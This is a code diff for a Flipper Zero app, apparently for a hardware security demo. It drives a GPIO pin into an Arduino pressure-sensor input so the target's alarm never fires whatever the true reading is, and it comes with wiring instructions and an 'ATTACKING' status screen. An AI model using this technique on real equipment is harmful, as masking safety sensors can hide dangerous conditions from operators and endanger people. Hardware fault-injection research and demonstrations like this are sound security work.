@@ -1,3 +1,19 @@
+// Aegis Edge — Flipper-side GPIO fault injector.
+//
+// Wiring (shared ground is mandatory):
+//
+//   Flipper PA7 (ext. header pin 2) ──[ 1 kΩ ]── Arduino A0  (pressure)
+//   Flipper GND (ext. header pin 11) ──────────── Arduino GND
+//
+// Behaviour:
+//   IDLE   — PA7 in analog/high-Z, target sensor reads normally.
+//   ATTACK — PA7 driven push-pull HIGH (3.3 V). PA7's ~50 Ω output overpowers
+//            the sensor wiper, pinning A0 inside the firmware's safe band so
+//            the target never alarms regardless of true input.
+//
+// The 1 kΩ series resistor protects the STM32 from any 5 V back-feed if A0
+// is ever misconfigured as an output.
+
 #include <furi.h>
 #include <furi_hal.h>
 #include <furi_hal_gpio.h>
@@ -5,19 +21,11 @@
 #include <gui/gui.h>
 #include <input/input.h>
 
-#define ATTACK_PIN (&gpio_ext_pa7) // Flipper external pin 2
-
-typedef enum {
-    AttackModeOff = 0,
-    AttackModeSpoof,
-    AttackModeNoise,
-    AttackModeCount,
-} AttackMode;
+#define ATTACK_PIN (&gpio_ext_pa7) // Flipper external pin 2 → 1 kΩ → Arduino A0
 
 typedef struct {
-    AttackMode mode;
-    uint16_t pulse_period_us;
-    uint32_t shots;
+    bool attacking;
+    uint32_t since_tick;
     FuriMutex* mutex;
 } AppState;
 
@@ -25,13 +33,9 @@ typedef struct {
     FuriMessageQueue* queue;
 } AppCtx;
 
-static const char* mode_label(AttackMode m) {
-    switch(m) {
-    case AttackModeOff: return "OFF";
-    case AttackModeSpoof: return "SPOOF (HIGH)";
-    case AttackModeNoise: return "NOISE (PULSE)";
-    default: return "?";
-    }
+static void draw_centered_str(Canvas* canvas, int y, const char* str) {
+    uint16_t w = canvas_string_width(canvas, str);
+    canvas_draw_str(canvas, (128 - (int)w) / 2, y, str);
 }
 
 static void draw_callback(Canvas* canvas, void* ctx) {
@@ -39,26 +43,55 @@ static void draw_callback(Canvas* canvas, void* ctx) {
     furi_mutex_acquire(s->mutex, FuriWaitForever);
 
     canvas_clear(canvas);
+
+    uint32_t tick = furi_get_tick();
+    bool fast_blink = (tick / 250) & 1;
+
+    /* --- decorative top bar --- */
+    canvas_draw_box(canvas, 0, 0, 128, 13);
+    canvas_set_color(canvas, ColorWhite);
+
     canvas_set_font(canvas, FontPrimary);
-    canvas_draw_str(canvas, 2, 11, "Aegis Attacker");
-    canvas_draw_line(canvas, 0, 13, 128, 13);
+    const char* title = "FAULT INJECTOR";
+    uint16_t tw = canvas_string_width(canvas, title);
+    int tx = (128 - (int)tw) / 2;
+    canvas_draw_str(canvas, tx, 10, title);
 
-    canvas_set_font(canvas, FontSecondary);
-    canvas_draw_str(canvas, 2, 25, "Mode:");
-    canvas_draw_str(canvas, 32, 25, mode_label(s->mode));
-
-    char buf[32];
-    if(s->mode == AttackModeNoise) {
-        snprintf(buf, sizeof(buf), "Period: %u us", s->pulse_period_us);
-        canvas_draw_str(canvas, 2, 36, buf);
-    } else {
-        canvas_draw_str(canvas, 2, 36, "Pin: PA7 (ext. P2)");
+    /* vertical stripes flanking the title */
+    for(int x = 3; x < tx - 4; x += 3) {
+        canvas_draw_line(canvas, x, 3, x, 9);
+    }
+    for(int x = tx + tw + 4; x < 119; x += 3) {
+        canvas_draw_line(canvas, x, 3, x, 9);
     }
 
-    snprintf(buf, sizeof(buf), "Shots: %lu", (unsigned long)s->shots);
-    canvas_draw_str(canvas, 2, 47, buf);
+    /* small blinking READY indicator (idle only) */
+    if(!s->attacking && fast_blink) {
+        canvas_draw_box(canvas, 121, 4, 4, 4);
+    }
 
-    canvas_draw_str(canvas, 2, 62, "OK:cycle  Up/Dn:rate");
+    canvas_set_color(canvas, ColorBlack);
+
+    /* --- big status block --- */
+    canvas_set_font(canvas, FontPrimary);
+    if(s->attacking) {
+        if(fast_blink) {
+            canvas_draw_box(canvas, 6, 22, 116, 24);
+            canvas_set_color(canvas, ColorWhite);
+            draw_centered_str(canvas, 38, "!! ATTACKING !!");
+            canvas_set_color(canvas, ColorBlack);
+        } else {
+            canvas_draw_frame(canvas, 6, 22, 116, 24);
+            draw_centered_str(canvas, 38, "!! ATTACKING !!");
+        }
+    } else {
+        canvas_draw_frame(canvas, 6, 22, 116, 24);
+        draw_centered_str(canvas, 38, "-- IDLE --");
+    }
+
+    /* --- subline: target wire --- */
+    canvas_set_font(canvas, FontSecondary);
+    draw_centered_str(canvas, 58, "TARGET: PA7 -> A0");
 
     furi_mutex_release(s->mutex);
 }
@@ -74,20 +107,11 @@ static void set_pin_safe(void) {
 }
 
 static void apply_mode(AppState* s) {
-    switch(s->mode) {
-    case AttackModeOff:
-        set_pin_safe();
-        break;
-    case AttackModeSpoof:
+    if(s->attacking) {
         furi_hal_gpio_init(ATTACK_PIN, GpioModeOutputPushPull, GpioPullNo, GpioSpeedLow);
         furi_hal_gpio_write(ATTACK_PIN, true);
-        break;
-    case AttackModeNoise:
-        furi_hal_gpio_init(ATTACK_PIN, GpioModeOutputPushPull, GpioPullNo, GpioSpeedHigh);
-        furi_hal_gpio_write(ATTACK_PIN, false);
-        break;
-    default:
-        break;
+    } else {
+        set_pin_safe();
     }
 }
 
@@ -95,9 +119,8 @@ int32_t aegis_attacker_app(void* p) {
     UNUSED(p);
 
     AppState state = {
-        .mode = AttackModeOff,
-        .pulse_period_us = 200, // ~5 kHz square wave
-        .shots = 0,
+        .attacking = false,
+        .since_tick = 0,
         .mutex = furi_mutex_alloc(FuriMutexTypeNormal),
     };
 
@@ -116,44 +139,34 @@ int32_t aegis_attacker_app(void* p) {
 
     InputEvent event;
     bool running = true;
-    bool pulse_level = false;
+    uint32_t last_redraw = 0;
 
     while(running) {
-        uint32_t timeout = (state.mode == AttackModeNoise) ? 0 : 100;
-        FuriStatus status = furi_message_queue_get(ctx.queue, &event, timeout);
+        FuriStatus status = furi_message_queue_get(ctx.queue, &event, 100);
 
-        if(status == FuriStatusOk) {
-            if(event.type == InputTypeShort || event.type == InputTypeRepeat) {
-                furi_mutex_acquire(state.mutex, FuriWaitForever);
-                switch(event.key) {
-                case InputKeyOk:
-                    state.mode = (state.mode + 1) % AttackModeCount;
-                    apply_mode(&state);
-                    state.shots = 0;
-                    break;
-                case InputKeyUp:
-                    if(state.pulse_period_us > 20) state.pulse_period_us -= 20;
-                    break;
-                case InputKeyDown:
-                    if(state.pulse_period_us < 5000) state.pulse_period_us += 20;
-                    break;
-                case InputKeyBack:
-                    running = false;
-                    break;
-                default:
-                    break;
-                }
-                furi_mutex_release(state.mutex);
-                view_port_update(view_port);
+        if(status == FuriStatusOk && event.type == InputTypeShort) {
+            furi_mutex_acquire(state.mutex, FuriWaitForever);
+            switch(event.key) {
+            case InputKeyOk:
+                state.attacking = !state.attacking;
+                state.since_tick = furi_get_tick();
+                apply_mode(&state);
+                break;
+            case InputKeyBack:
+                running = false;
+                break;
+            default:
+                break;
             }
+            furi_mutex_release(state.mutex);
+            view_port_update(view_port);
         }
 
-        if(state.mode == AttackModeNoise) {
-            pulse_level = !pulse_level;
-            furi_hal_gpio_write(ATTACK_PIN, pulse_level);
-            furi_delay_us(state.pulse_period_us / 2);
-            state.shots++;
-            if((state.shots & 0x3FF) == 0) view_port_update(view_port);
+        /* keep the blink animation alive */
+        uint32_t now = furi_get_tick();
+        if(now - last_redraw >= 200) {
+            last_redraw = now;
+            view_port_update(view_port);
         }
     }
 
